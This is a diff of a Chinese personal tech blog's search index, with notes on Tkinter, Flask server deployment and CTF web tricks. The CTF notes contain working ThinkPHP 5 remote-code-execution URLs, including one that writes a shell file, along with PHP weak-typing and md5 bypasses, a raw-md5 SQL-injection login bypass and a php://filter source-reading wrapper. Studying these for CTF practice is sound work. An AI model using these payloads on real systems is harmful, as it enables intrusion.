@@ -1,6 +1,504 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Linux相关笔记</title>
+    <url>/2020/06/16/Linux%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Mysql基础补完</title>
+    <url>/2020/06/17/Mysql%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%AE%8C/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>PHP反序列化笔记</title>
+    <url>/2020/06/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>CTF中的命令执行</title>
+    <url>/2020/06/16/CTF%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Python利用多线程和多进程编写脚本</title>
+    <url>/2020/06/16/Python%E5%88%A9%E7%94%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Tkinter学习笔记</title>
+    <url>/2020/06/16/Tkinter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>简单的Python GUI… 要想强大一点还是去用PyQt了。</p>
+<a id="more"></a>
+<h1>使用逻辑</h1>
+<ol>
+<li>
+<p>import tkinter。</p>
+</li>
+<li>
+<p>实例化窗口对象。例如</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">window</span> = tkinter.Tk()</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>对刚才实例化的窗口对象进行设置，如</p>
+<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">window</span>.<span class="meta">title</span>(<span class="string">'This is a titie.'</span>)</span><br><span class="line"><span class="meta">window</span>.geometry(<span class="string">'200x100'</span>)   # 中间的符号是英文字母<span class="string">'x'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>实例化各窗口内的控件并将其放置在窗口的某个位置，例如</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 实例化标签对象, 注意：方法的首字母大写</span></span><br><span class="line">label = tkinter.Label(window, <span class="attribute">text</span>=<span class="string">''</span>, <span class="attribute">textvariable</span>=..., font=(<span class="string">'Consolas'</span>, 20, <span class="string">'bold'</span>), <span class="attribute">width</span>=150, <span class="attribute">height</span>=100)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放置在窗口的某个位置</span></span><br><span class="line">label.pack()</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>令主窗口自我刷新，完成GUI的交互作用，如</p>
+<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.mainloop()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1>简单控件的使用方法小结</h1>
+<ul>
+<li>
+<p>Label控件</p>
+<p>Label控件是tkinter中的标签控件。用于显示文本和图像。语法格式如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">label = tkinter.<span class="constructor">Label( <span class="params">master</span>, <span class="params">options</span>, <span class="operator">...</span>)</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>master: 框架的父容器，可理解为某个窗口。</p>
+</li>
+<li>
+<p>options: 可设置的属性。这些选项可以用键值对的形式设置，并以逗号分隔。</p>
+<p>以下是可选项清单：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">序号</th>
+<th style="text-align:center">可选项 &amp; 描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">**anchor **    文本或图像在背景内容区的位置，默认为 center，可选值为（n,s,w,e,ne,nw,sw,se,center）eswn 是东南西北英文的首字母，表示：上北下南左西右东。</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center"><strong>bg</strong>  标签背景颜色</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center"><strong>bd</strong>  标签的大小，默认为 2 个像素</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center"><strong>bitmap</strong>  指定标签上的位图，如果指定了图片，则该选项忽略</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:center">**cursor ** 鼠标移动到标签时，光标的形状，可以设置为 arrow, circle, cross, plus 等。</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">**font ** 设置字体。</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">**fg ** 设置前景色。</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td style="text-align:center">**height ** 标签的高度，默认值是 0。</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td style="text-align:center">**image ** 设置标签图像。</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td style="text-align:center"><strong>justify</strong> 定义对齐方式，可选值有：LEFT,RIGHT,CENTER，默认为 CENTER。</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td style="text-align:center"><strong>padx</strong>  x轴间距，以像素计，默认 1。</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td style="text-align:center"><strong>pady</strong>  y轴间距，以像素计，默认 1。</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td style="text-align:center"><strong>relief</strong>  边框样式，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>14</strong></td>
+<td style="text-align:center">**text ** 设置文本，可以包含换行符(\n)。</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>15</strong></td>
+<td style="text-align:center"><strong>textvariable</strong>  标签显示 Tkinter 变量，StringVar。如果变量被修改，标签文本将自动更新。</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td style="text-align:center">**underline ** 设置下划线，默认 -1，如果设置 1，则是从第二个字符开始画下划线。</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td style="text-align:center">**width ** 设置标签宽度，默认值是 0，自动计算，单位以像素计。</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td style="text-align:center">**wraplength ** 设置标签文本为多少行显示，默认为 0。</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+</li>
+<li>
+<p>Button控件</p>
+<p>Button控件是tkinter中的按钮控件。用于在程序中显示按钮。按钮可与一个command函数进行关联，在按下按钮时执行command函数。语法格式如下：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">button = tkinter.Button ( master, <span class="attribute">option</span>=value, <span class="built_in">..</span>. )</span><br></pre></td></tr></table></figure>
+<p>以下是可选项清单：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">序号</th>
+<th style="text-align:center">可选项 &amp; 描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center"><strong>activebackground</strong>  当鼠标放上去时，按钮的背景色</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">**activeforeground ** 当鼠标放上去时，按钮的前景色</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:center">**bd ** 按钮边框的大小，默认为 2 个像素</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center">**bg ** 按钮的背景色</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>5</strong></td>
+<td style="text-align:center"><strong>command</strong>  按钮关联的函数，当按钮被点击时，执行该函数</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">**fg ** 按钮的前景色（按钮文本的颜色）</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">**font ** 文本字体</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td style="text-align:center">**height ** 按钮的高度</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td style="text-align:center">**highlightcolor ** 要高亮的颜色</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td style="text-align:center"><strong>image</strong>  按钮上要显示的图片</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td style="text-align:center">**justify ** 显示多行文本的时候,设置不同行之间的对齐方式，可选项包括LEFT, RIGHT, CENTER</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td style="text-align:center">**padx **  按钮在x轴方向上的内边距(padding)，是指按钮的内容与按钮边缘的距离</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td style="text-align:center">**pady ** 按钮在y轴方向上的内边距(padding)</td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td style="text-align:center">**relief ** 边框样式，设置控件3D效果，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
+</tr>
+<tr>
+<td style="text-align:center">15</td>
+<td style="text-align:center">**state ** 设置按钮组件状态,可选的有NORMAL、ACTIVE、 DISABLED。默认 NORMAL。</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td style="text-align:center">**underline ** 下划线。默认按钮上的文本都不带下划线。取值就是带下划线的字符串索引，为 0 时，第一个字符带下划线，为 1 时，前两个字符带下划线，以此类推</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td style="text-align:center">**width ** 按钮的宽度，如未设置此项，其大小以适应按钮的内容（文本或图片的大小）</td>
+</tr>
+<tr>
+<td style="text-align:center">18</td>
+<td style="text-align:center">**wraplength ** 限制按钮每行显示的字符的数量</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td style="text-align:center">**text ** 按钮的文本内容</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td style="text-align:center"><strong>anchor</strong>  锚选项，控制文本的位置，默认为中心</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>开发</tag>
+        <tag>python</tag>
+        <tag>GUI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF中琐碎的姿势们</title>
+    <url>/2020/06/16/CTF%E4%B8%AD%E7%90%90%E7%A2%8E%E7%9A%84%E5%A7%BF%E5%8A%BF%E4%BB%AC/</url>
+    <content><![CDATA[<p>记录CTF中的一些琐碎杂项备忘，方便查找。</p>
+<a id="more"></a>
+<h2 id="HTML">HTML</h2>
+<h3 id="HTML中的特殊转义字符">HTML中的特殊转义字符</h3>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>十进制</th>
+<th>转义字符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;</td>
+<td><code>&amp;#34;</code></td>
+<td><code>&amp;quot;</code></td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td><code>&amp;#38;</code></td>
+<td><code>&amp;amp;</code></td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td><code>&amp;#60;</code></td>
+<td><code>&amp;lt;</code></td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td><code>&amp;#62;</code></td>
+<td><code>&amp;gt;</code></td>
+</tr>
+<tr>
+<td>不断开空格(non-breaking space)</td>
+<td><code>&amp;#160;</code></td>
+<td><code>&amp;nbsp;</code></td>
+</tr>
+<tr>
+<td>|</td>
+<td><code>&amp;#166;</code></td>
+<td><code>&amp;brvbar;</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="Linux">Linux</h2>
+<h3 id="vim">vim</h3>
+<h3 id="swp-swo-…-文件">.swp/.swo/… 文件</h3>
+<p>这些文件是vim创建的临时文件。一个文件在vim中打开之后会创建 .swp 文件。如果 .swp 文件已存在，则创建 .swo 文件，若 .swo 文件存在则创建 .swn 文件，以此类推。vim 关闭时这些文件将自动被删除，若vim崩溃或被杀死，则保留。有时可用作 CTF 中源码的来源。</p>
+<p>例如：一个叫 <code>abc.php</code> 的文件会产生一个名为 <code>.abc.php.swp</code> 的临时文件。注意文件最前面有一个小点。</p>
+<h2 id="PHP">PHP</h2>
+<h3 id="PHP基础">PHP基础</h3>
+<h4 id="的区别">-&gt; , =&gt; , :: 的区别</h4>
+<p><code>-&gt;</code> 是插入式解引用的符号，用法与C语言相似。<code>=&gt;</code> 在数组中常常出现，用来连接键值对。<code>::</code> 与C语言中的 <code>.</code> 类似，用于调用类的内部成员，或类之间的相互调用。</p>
+<h3 id="phps">.phps</h3>
+<p>服务器遇php文件会解析。此时若想要读源码要使用phps文件。源码泄露的来源。</p>
+<h3 id="thinkphp5-RCE">thinkphp5 RCE</h3>
+<p>5.1.x php版本&gt;5.5</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=assert&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=phpinfo()</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+<p>5.0.x php版本&gt;=5.4</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>
+<p>还可参见<a href="https://y4er.com/post/thinkphp5-rce/#5020" target="_blank" rel="noopener"><strong>Thinkphp</strong>5 RCE总结 – Y4er的博客</a>。</p>
+<h2 id="配置错误">配置错误</h2>
+<h3 id="源码泄露">源码泄露</h3>
+<h4 id="常见的网站源码备份文件后缀">常见的网站源码备份文件后缀</h4>
+<ul>
+<li>tar</li>
+<li>tar.gz</li>
+<li>zip</li>
+<li>rar</li>
+</ul>
+<h4 id="常见的网站源码备份文件名">常见的网站源码备份文件名</h4>
+<ul>
+<li>web</li>
+<li>website</li>
+<li>backup</li>
+<li>back</li>
+<li>www</li>
+<li>wwwroot</li>
+<li>temp</li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>前端三剑客笔记</title>
+    <url>/2020/06/16/%E5%89%8D%E7%AB%AF%E4%B8%89%E5%89%91%E5%AE%A2%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>PHP相关姿势</title>
+    <url>/2020/06/16/PHP%E7%9B%B8%E5%85%B3%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<p>整理 CTF 中 PHP 相关的利用姿势，不定期补充。</p>
+<a id="more"></a>
+<h2 id="弱类型相关姿势">弱类型相关姿势</h2>
+<p>弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。</p>
+<h3 id="比较操作符">比较操作符</h3>
+<h4 id="类型转换">类型转换</h4>
+<p>弱等的比较中不需左右两边的类型相等，会经过转换变成相同的类型后比较，由此产生安全问题。如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">NULL</span>;$b=<span class="keyword">FALSE</span>;  <span class="comment">//$a==$b</span></span><br><span class="line">$a=<span class="string">''</span>;$b=<span class="keyword">NULL</span>;  <span class="comment">//$a==$b</span></span><br></pre></td></tr></table></figure>
+<p>还有，bool类型的true跟任意字符串可以弱类型相等。</p>
+<p>以及类型转换的一些规则，如字符串转数字会从不满足转换规则的位置开始截断只取最前边的数字部分而不会报错等。（ 注：数字到字符串可以用strval()，字符串和数字可以用intval() ）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">'0'</span>		<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> == <span class="string">'abcdefg'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> === <span class="string">'abcdefg'</span>	<span class="comment">//false</span></span><br><span class="line"><span class="number">1</span> == <span class="string">'1abcdef'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+<h4 id="哈希比较">哈希比较</h4>
+<h5 id="md5-弱等的绕过">md5 弱等的绕过</h5>
+<p>md5(‘240610708’) == md5(‘QNKCDZO’) (0exxxxxxx)</p>
+<p>在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足0e\d+这种模式就不会相等。</p>
+<p>0e\d+ 的字符串整理：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure>
+<p>强等的绕过方法放在后文的 内置函数的参数松散性 一节中。</p>
+<h5 id="绕过-md5-函数注入-MySQL">绕过 md5()函数注入 MySQL</h5>
+<p><code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6（<code>'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>），而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 <code>select * from 'admin' where password='' or '6xxxxx'</code></p>
+<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过 md5()函数。</p>
+<p>或者 129581926211651571912466741651878684928，<br>
+md5 值为 <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8</code> 也可行。</p>
+<h4 id="十六进制转换">十六进制转换</h4>
+<p>还存在一种十六进制余字符串进行比较运算时的问题。例子如下：</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"123456"</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="number">123456</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"1e240"</span>		<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
+<p>当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1e240解析成为十进制就是123456，所以与 int 类型和 string 类型的 123456 比较都是相等。攻防平台中的<strong>起名字真难</strong>就是考察的这个特性。</p>
+<h4 id="json绕过">json绕过</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key ==$key ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于$key的值，但$key的值我们不知道,这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过。</p>
+<p>payload: message={“key”,true}</p>
+<h3 id="内置函数的参数松散性">内置函数的参数松散性</h3>
+<h4 id="md5-强等的绕过">md5()  强等的绕过</h4>
+<p>md5()中的需要是一个string类型的参数。如果md5 函数的参数是一个数组值，会导致函数返回 false。除了 md5 之外 sha1 函数也有这个特性。 例如传入为 <code>?a[]=1&amp;b[]=2</code></p>
+<p>或者找到 md5 值相等的二进制数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+<h4 id="strcmp">strcmp()</h4>
+<p>strcmp()函数在PHP官方手册中的描述是<code>int strcmp ( string $str1 , string $str2 )</code>,需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。<br>
+如果传入给出strcmp()的参数是其它类型，可能产生其它不希望的结果。如：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">var_dump(strcmp($<span class="built_in">array</span>,<span class="string">'123'</span>)); <span class="comment">//null,在某种意义上null也就是相当于false，。</span></span><br></pre></td></tr></table></figure>
+<h4 id="switch">switch()</h4>
+<p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$i =<span class="string">"2abc"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is 3"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个时候程序输出的是<code>i is less than 3 but not negative</code>，是由于switch()函数将$i进行了类型转换，转换结果为2。</p>
+<h4 id="in-array">in_array()</h4>
+<p>在PHP手册中，in_array()函数的解释是<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>,如果strict参数没有提供，那么in_array就会使用松散比较来判断$needle是否在$haystack中。当strince的值为true时，needls的类型和haystack中的类型会被严格比较。</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=<span class="literal">[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,'<span class="number">3</span>']</span>;</span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('<span class="params">abc</span>', $<span class="params">array</span>)</span>);  <span class="comment">//true</span></span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('1bc', $<span class="params">array</span>)</span>);	<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+<p>array_search()与in_array()也有一样的问题。</p>
+<h2 id="PHP-Filter-相关姿势">PHP Filter 相关姿势</h2>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu+gunicorn+nginx在ECS上搭建Flask环境</title>
+    <url>/2020/10/01/gunicorn+nginx%E5%9C%A8ECS%E4%B8%8A%E6%90%AD%E5%BB%BAFlask%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<p>网络上能搜索到的资源基本都有些疏漏的地方，把自己的配置过程Po上来做个参考防止重复踩坑。</p>
+<a id="more"></a>
+<p><a href="https://zhuanlan.zhihu.com/p/22126999" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22126999</a> 这篇专栏写得还不错，参考了其中的一些内容做了自己的配置，不过这篇里也有一些没写清楚的超级坑点，坑了我好久，我在这里补充一些内容来防止重复踩坑了。</p>
+<p>相关版本清单如下：</p>
+<blockquote>
+<p>系统： Ubuntu 16.04 64位</p>
+<p>WSGI： Gunicorn</p>
+<p>进程监控： Supervisor</p>
+<p>服务器软件：nginx</p>
+<p>Python版本： python3.5.2</p>
+</blockquote>
+<h1>云服务器相关</h1>
+<p>笔者用的是阿里云ECS的学生机，当然你用其它家的产品也大同小异啦。</p>
+<p>ssh连接：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
+<p>建立普通用户账号：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd www -d /home/www -m</span><br><span class="line">passwd www</span><br></pre></td></tr></table></figure>
+<h1>安装相关支持</h1>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure>
+<p>如果安装virtualenv遇到以下报错：</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">IOError: [Errno <span class="number">2</span>] <span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory: <span class="string">'/tmp/pip-kYFqUa-build/setup.py'</span></span><br></pre></td></tr></table></figure>
+<p>尝试：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure>
+<h1>页面配置</h1>
+<p>先保留root终端，新开一个终端并使用刚才新建的用户登录服务器。</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> www<span class="variable">@xxx</span>.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
+<p>创建网站根目录：</p>
+<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> blog</span><br></pre></td></tr></table></figure>
+<p>创建了工程的文件夹，这里用blog来代替，根据实际情况要换成其它的命名。</p>
+<p>下面创建虚拟环境：</p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">cd</span> <span class="keyword">blog</span></span><br><span class="line"><span class="keyword">virtualenv </span>-p /usr/<span class="keyword">bin/python3 </span>venv</span><br></pre></td></tr></table></figure>
+<p>使用SFTP可以上传本地的工程文件到blog文件夹。建议使用www用户。</p>
+<p>pip包生成requiements.txt:</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">freeze</span> &gt; requirements.txt</span><br></pre></td></tr></table></figure>
+<h1>Gunicorn配置</h1>
+<p>下面配置Gunicorn：</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">source</span> <span class="string">venv/bin/activate</span></span><br><span class="line"><span class="attr">pip</span> <span class="string">install gunicorn</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/home/www/blog</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">gunicorn.conf</span></span><br></pre></td></tr></table></figure>
+<p>之后用vim写入：</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程数</span></span><br><span class="line"><span class="attr">workers</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># 监听本地的哪个端口</span></span><br><span class="line"><span class="attr">bind</span> = <span class="string">'127.0.0.1:8000'</span></span><br></pre></td></tr></table></figure>
+<p><code>:wq</code>保存退出。</p>
+<p>安装组件：</p>
+<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -r requirements.txt</span><br></pre></td></tr></table></figure>
+<p>创建日志文件夹：</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> logs</span><br></pre></td></tr></table></figure>
+<p>退出虚拟环境：</p>
